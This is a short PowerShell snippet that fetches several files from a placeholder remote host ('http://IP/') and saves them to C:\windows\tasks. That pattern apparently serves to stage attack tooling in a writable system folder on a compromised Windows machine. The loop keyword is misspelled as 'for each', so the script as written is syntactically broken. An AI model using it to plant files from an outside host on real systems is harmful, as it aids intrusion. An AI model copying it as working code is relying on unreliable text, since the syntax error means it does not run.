$baseURL = "http://IP/"
$fileNames = @("File1","File2","File3")
$downloadPath = "C:\windows\tasks"

for each ($fileName in $fileNames){
    $url = $baseURL + $fileName
    $filePath = Join-Path $downloadPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $filePath
    Write-Host "Downloaded $fileName to $filePath"
}